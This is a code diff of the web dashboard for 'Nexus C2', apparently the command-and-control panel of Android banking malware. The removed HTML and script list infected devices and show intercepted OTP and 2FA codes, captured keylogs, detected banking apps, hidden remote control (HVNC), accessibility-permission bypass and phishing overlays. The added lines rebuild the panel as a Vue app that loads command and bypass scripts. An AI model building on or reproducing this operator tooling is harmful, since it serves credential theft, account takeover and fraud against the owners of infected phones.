@@ -2,270 +2,30 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <title>Nexus C2</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⬡</text></svg>">
-  <link rel="stylesheet" href="/static/css/dash.css">
+  <link rel="stylesheet" href="/static/css/app.css">
 </head>
 <body>
+  <div id="app"></div>
 
-<div id="app">
+  <!-- Vue 3 CDN (includes template compiler for in-browser compilation) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.4.31/vue.global.prod.min.js"></script>
 
-  <!-- ── Sidebar ──────────────────────────────────────────────────────────── -->
-  <aside id="sidebar">
-    <div id="sidebar-logo">
-      <div class="logo-icon">⬡</div>
-      <div>
-        <div class="logo-text">NEXUS</div>
-        <div class="logo-ver">C2 v5.0</div>
-      </div>
-    </div>
+  <!-- Command catalog (no dependency on dash state) -->
+  <script src="/static/js/commands.js"></script>
 
-    <nav id="sidebar-nav">
-      <div class="nav-section">Monitor</div>
-      <div class="nav-item active" data-pane="devices">
-        <span class="nav-icon">📱</span>
-        <span class="nav-label">Devices</span>
-        <span class="nav-badge green" id="stat-online" style="display:none">0</span>
-      </div>
-      <div class="nav-item" data-pane="feed">
-        <span class="nav-icon">⚡</span>
-        <span class="nav-label">Live Feed</span>
-      </div>
-      <div class="nav-item" data-pane="otp">
-        <span class="nav-icon">🔑</span>
-        <span class="nav-label">OTP Intercepts</span>
-        <span class="nav-badge yellow" id="nav-otp" style="display:none">0</span>
-      </div>
-      <div class="nav-item" data-pane="hvnc">
-        <span class="nav-icon">🖥</span>
-        <span class="nav-label">HVNC Viewer</span>
-      </div>
+  <!-- HVNC renderer (GPU Worker decode pipeline) -->
+  <script src="/static/js/hvnc.js"></script>
 
-      <div class="nav-section" style="margin-top:10px">Data</div>
-      <div class="nav-item" data-pane="keylogs-g">
-        <span class="nav-icon">⌨️</span>
-        <span class="nav-label">All Keylogs</span>
-      </div>
-      <div class="nav-item" data-pane="detections">
-        <span class="nav-icon">💳</span>
-        <span class="nav-label">Detections</span>
-      </div>
+  <!-- WS client -->
+  <script src="/static/js/ws-client.js"></script>
 
-      <div class="nav-section" style="margin-top:10px">Config</div>
-      <div class="nav-item" data-pane="bypass">
-        <span class="nav-icon">🔓</span>
-        <span class="nav-label">A11y Bypass</span>
-      </div>
-      <div class="nav-item" data-pane="overlays">
-        <span class="nav-icon">🎭</span>
-        <span class="nav-label">Overlays</span>
-      </div>
-    </nav>
+  <!-- Main Vue 3 app -->
+  <script src="/static/js/app.js"></script>
 
-    <div id="sidebar-footer">
-      <div class="conn-indicator">
-        <div class="conn-dot" id="conn-dot"></div>
-        <span id="conn-label">Connecting…</span>
-      </div>
-      <div style="margin-top:6px;display:flex;gap:8px;font-size:10px;color:var(--text-3)">
-        <span>Ops: <span id="stat-ops">0</span></span>
-        <span>Queue: <span id="stat-queued">0</span></span>
-      </div>
-    </div>
-  </aside>
-
-  <!-- ── Main ─────────────────────────────────────────────────────────────── -->
-  <div id="main">
-
-    <!-- Header -->
-    <div id="header">
-      <div id="header-title">Devices</div>
-      <div class="stat-pill green"><span>Online</span><span class="val" id="hdr-online">0</span></div>
-      <div class="stat-pill"><span>Total</span><span class="val" id="hdr-total">0</span></div>
-      <div class="stat-pill yellow"><span>Queue</span><span class="val" id="hdr-queue">0</span></div>
-    </div>
-
-    <!-- Content -->
-    <div id="content">
-
-      <!-- ── Devices pane ─────────────────────────────────────────────────── -->
-      <div class="pane active" id="pane-devices">
-        <div id="devices-pane">
-
-          <!-- Device list column -->
-          <div id="device-list-col">
-            <div id="dl-header">
-              <input id="dl-search" type="search" placeholder="Search devices…">
-              <button class="btn btn-ghost btn-sm btn-icon" title="Refresh" onclick="location.reload()">↺</button>
-            </div>
-            <div id="dl-list">
-              <div class="empty-state">
-                <div class="es-icon">📡</div>
-                <div class="es-text">Waiting for connections…</div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Device detail column -->
-          <div id="device-detail-col">
-            <div class="empty-state" style="height:100%">
-              <div class="es-icon">👈</div>
-              <div class="es-text">Select a device</div>
-            </div>
-          </div>
-
-        </div>
-      </div>
-
-      <!-- ── HVNC pane ────────────────────────────────────────────────────── -->
-      <div class="pane" id="pane-hvnc" style="flex-direction:column">
-        <div style="padding:8px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;background:var(--bg-1);flex-shrink:0">
-          <button class="btn btn-ghost btn-sm" id="hvnc-back">← Back</button>
-          <span id="hvnc-pane-header" style="font-size:13px;color:var(--text-1)">HVNC Viewer</span>
-        </div>
-        <div id="hvnc-inner" style="flex:1;overflow:hidden;background:#000"></div>
-      </div>
-
-      <!-- ── OTP pane ─────────────────────────────────────────────────────── -->
-      <div class="pane" id="pane-otp" style="flex-direction:column;overflow:hidden">
-        <div style="padding:10px 14px;border-bottom:1px solid var(--border);font-size:11px;color:var(--text-2);background:var(--bg-1);flex-shrink:0;display:flex;justify-content:space-between;align-items:center">
-          <span>OTP / 2FA Intercepts</span>
-          <button class="btn btn-ghost btn-xs" onclick="S.otps=[];renderOTPPane()">Clear</button>
-        </div>
-        <div id="otp-pane" style="flex:1;overflow:auto;padding:14px;display:flex;flex-direction:column;gap:8px">
-          <div class="empty-state" style="height:100%">
-            <div class="es-icon">🔑</div>
-            <div class="es-text">No OTPs intercepted yet</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- ── Feed pane ────────────────────────────────────────────────────── -->
-      <div class="pane" id="pane-feed" style="flex-direction:column;overflow:hidden">
-        <div style="padding:10px 14px;border-bottom:1px solid var(--border);font-size:11px;color:var(--text-2);background:var(--bg-1);flex-shrink:0;display:flex;justify-content:space-between;align-items:center">
-          <span>Live Event Feed</span>
-          <button class="btn btn-ghost btn-xs" onclick="S.feed=[];renderFeedPane()">Clear</button>
-        </div>
-        <div id="feed-list" style="flex:1;overflow:auto"></div>
-      </div>
-
-      <!-- ── All Keylogs pane ─────────────────────────────────────────────── -->
-      <div class="pane" id="pane-keylogs-g" style="flex-direction:column;overflow:hidden">
-        <div id="pane-keylogs-g-content" style="flex:1;overflow:auto"></div>
-      </div>
-
-      <!-- ── Detections pane ──────────────────────────────────────────────── -->
-      <div class="pane" id="pane-detections" style="flex-direction:column;overflow:hidden">
-        <div id="pane-detections-content" style="flex:1;overflow:auto"></div>
-      </div>
-
-      <!-- ── Overlays pane ────────────────────────────────────────────────── -->
-      <div class="pane" id="pane-overlays" style="flex-direction:column;overflow:hidden">
-        <div id="pane-overlays-content" style="flex:1;overflow:auto;padding:14px">
-          <div class="empty-state" style="height:200px">
-            <div class="es-icon">🎭</div>
-            <div class="es-text">Overlay library</div>
-          </div>
-        </div>
-      </div>
-
-
-      <!-- ── Bypass pane ──────────────────────────────────────────────────── -->
-      <div class="pane" id="pane-bypass" style="flex-direction:column;overflow:hidden">
-        <div style="flex:1;overflow:auto;display:flex;flex-direction:column" id="bypass-pane-inner">
-          <div class="empty-state" style="height:200px">
-            <div class="es-icon">🔓</div>
-            <div class="es-text">Select a device first, then open the Bypass panel from device detail</div>
-          </div>
-        </div>
-      </div>
-    </div><!-- /content -->
-  </div><!-- /main -->
-</div><!-- /app -->
-
-<!-- ── Modal ──────────────────────────────────────────────────────────────── -->
-<div id="modal-backdrop">
-  <div class="modal" style="min-width:380px">
-    <div class="modal-header">
-      <span class="modal-title" id="modal-title">Modal</span>
-      <button class="modal-close" onclick="closeModal()">✕</button>
-    </div>
-    <div class="modal-body" id="modal-body"></div>
-    <div class="modal-footer" id="modal-footer"></div>
-  </div>
-</div>
-
-<!-- ── Toasts ─────────────────────────────────────────────────────────────── -->
-<div id="toast-container"></div>
-
-<!-- ── Scripts ────────────────────────────────────────────────────────────── -->
-<script src="/static/js/ws-client.js"></script>
-<script src="/static/js/commands.js"></script>
-<script src="/static/js/hvnc.js"></script>
-<script src="/static/js/dash.js"></script>
-
-<script>
-// ── Global pane lazy loaders ──────────────────────────────────────────────
-const _paneLoaders = {
-  'keylogs-g': async () => {
-    const rows = await api('/api/keylogs?limit=500');
-    const c = document.getElementById('pane-keylogs-g-content');
-    if (!rows.length) { c.innerHTML = '<div class="empty-state" style="height:200px"><div class="es-icon">⌨️</div><div class="es-text">No keylogs yet</div></div>'; return; }
-    let html = '<table class="nx-table"><thead><tr><th>Time</th><th>Device</th><th>App</th><th>Text</th></tr></thead><tbody>';
-    for (const r of rows)
-      html += `<tr><td>${fmtTs(r.ts)}</td><td class="mono text-dim" style="font-size:10px">${esc(deviceName(r.dev_id))}</td><td>${esc(r.app||r.pkg||'?')}</td><td class="mono">${r.is_password?'●●●●':esc((r.text||'').slice(0,120))}</td></tr>`;
-    html += '</tbody></table>';
-    c.innerHTML = html;
-  },
-  'detections': async () => {
-    const rows = await api('/api/detections');
-    const c = document.getElementById('pane-detections-content');
-    if (!rows.length) { c.innerHTML = '<div class="empty-state" style="height:200px"><div class="es-icon">💳</div><div class="es-text">No financial apps detected yet</div></div>'; return; }
-    let html = '<table class="nx-table"><thead><tr><th>Device</th><th>App</th><th>Package</th><th>Category</th><th>Country</th></tr></thead><tbody>';
-    for (const r of rows)
-      html += `<tr><td class="mono text-dim" style="font-size:10px">${esc(deviceName(r.dev_id))}</td><td>${esc(r.name||'?')}</td><td class="mono" style="font-size:10px">${esc(r.package||'')}</td><td><span class="${r.category==='financial'?'text-yellow':'text-blue'}">${esc(r.category||'?')}</span></td><td>${esc(r.country||'—')}</td></tr>`;
-    html += '</tbody></table>';
-    c.innerHTML = html;
-  },
-};
-
-// Hook pane switches to call lazy loaders
-const _origSwitch = window.switchPane;
-window.switchPane = id => {
-  _origSwitch(id);
-  if (_paneLoaders[id]) _paneLoaders[id]().catch(e => console.error(e));
-  const titles = {
-    devices: 'Devices',
-    hvnc: 'HVNC Viewer',
-    otp: 'OTP Intercepts',
-    feed: 'Live Feed',
-    'keylogs-g': 'All Keylogs',
-    detections: 'App Detections',
-    overlays: 'Phishing Overlays',
-  };
-  const t = document.getElementById('header-title');
-  if (t) t.textContent = titles[id] || id;
-};
-
-// Header stat counters linked to init event
-document.addEventListener('DOMContentLoaded', () => {
-  // Polyfill updateHeaderStats to also drive the header pills
-  const _orig = window.updateHeaderStats;
-  window.updateHeaderStats = s => {
-    _orig && _orig(s);
-    const h = (id, val) => { const e = document.getElementById(id); if (e && val != null) e.textContent = val; };
-    h('hdr-online', s.online ?? s.online_devices);
-    h('hdr-total', s.total ?? s.devices_total ?? Object.keys(S.devices).length);
-    h('hdr-queue', s.queued_cmds);
-    const onlineBadge = document.getElementById('stat-online');
-    if (onlineBadge) {
-      onlineBadge.textContent = s.online ?? 0;
-      onlineBadge.style.display = (s.online > 0) ? '' : 'none';
-    }
-  };
-});
-</script>
+  <!-- A11y bypass panel (optional, injected when bypass pane activates) -->
   <script src="/static/js/bypass-panel.js"></script>
 </body>
 </html>
